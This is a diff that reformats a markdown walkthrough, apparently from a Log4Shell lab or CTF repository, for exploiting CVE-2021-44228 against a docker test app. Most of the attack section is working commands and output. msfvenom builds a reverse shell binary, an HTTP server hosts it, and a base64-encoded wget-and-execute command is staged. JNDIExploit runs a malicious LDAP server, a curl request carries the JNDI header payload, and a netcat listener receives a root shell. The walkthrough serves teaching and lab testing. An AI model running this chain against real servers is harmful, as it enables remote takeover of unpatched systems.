@@ -66,8 +66,9 @@ $ docker exec vulnerable-app ls /tmp
 pwned
 ...
 ```
-Remote Code Execution - CTF Style "How to get a reverse shell"
-create a reverse shell file using msfvenom
+## Remote Code Execution - CTF Style "How to get a reverse shell"
+- create a reverse shell file using msfvenom
+```bash
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -75,24 +76,36 @@ No encoder specified, outputting raw payload
 Payload size: 74 bytes
 Final size of elf file: 194 bytes
 Saved as: /tmp/rev.elf
-prepare local server using python on our attacking machine
+```
+- prepare local server using python on our attacking machine
+```bash
 $ sudo python3 -m http.server 8081
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
-encode this command line below using base64
+```
+- encode this command line below using `base64`
+```bash
 wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
-copy base64 output
+```
+- copy base64 output
+```bash
 $ echo 'wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf' | base64
 d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK
-use JNDIExploit to spin up a malicious LDAP server
+```
+- use JNDIExploit to spin up a malicious LDAP server
+```bash
 $ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [+] LDAP Server Start Listening on 1389...
 [+] HTTP Server Start Listening on 8888...
 ...
-then, run the command below to trigger our command
+```
+- then, run the command below to trigger our command
+```
 $ curl 172.17.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK}'
 Hello, world!
-start netcat reverse shell on attacker machine nc -lvnp 4444, then netcat will be trigger a reverse shell
+```
+- start netcat reverse shell on attacker machine `nc -lvnp 4444`, then netcat will be trigger a reverse shell
+```bash
 $ nc -lvnp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
@@ -103,25 +116,26 @@ id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 whoami
 root
-the output from JNDIExploit
+```
+- the output from JNDIExploit
+```bash
 ...
 [+] Received LDAP Query: Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK
 [+] Paylaod: command
-[+] Command
-
-: wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
+[+] Command: wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
 
 [+] Sending LDAP ResourceRef result for Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK with basic remote reference payload
 [+] Send LDAP reference result for Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK redirecting to http://172.17.0.1:8888/ExploitgV2vh72T6X.class
 [+] New HTTP Request From /172.17.0.2:58650  /ExploitgV2vh72T6X.class
 [+] Receive ClassRequest: ExploitgV2vh72T6X.class
 [+] Response Code: 200
-
+```
 
 ## Reference
-
-https://www.lunasec.io/docs/blog/log4j-zero-day/
-https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
+- [Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+- [PSA: Log4Shell and the current state of JNDI injection](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/)
+- [Log4Shell sample vulnerable application (CVE-2021-44228)](https://github.com/christophetd/log4shell-vulnerable-app)
+- [JNDIExploit](https://github.com/feihong-cs/JNDIExploit) `Update (Dec 13th): The JNDIExploit repository has been removed from GitHub`
 
 ## Contributors
 
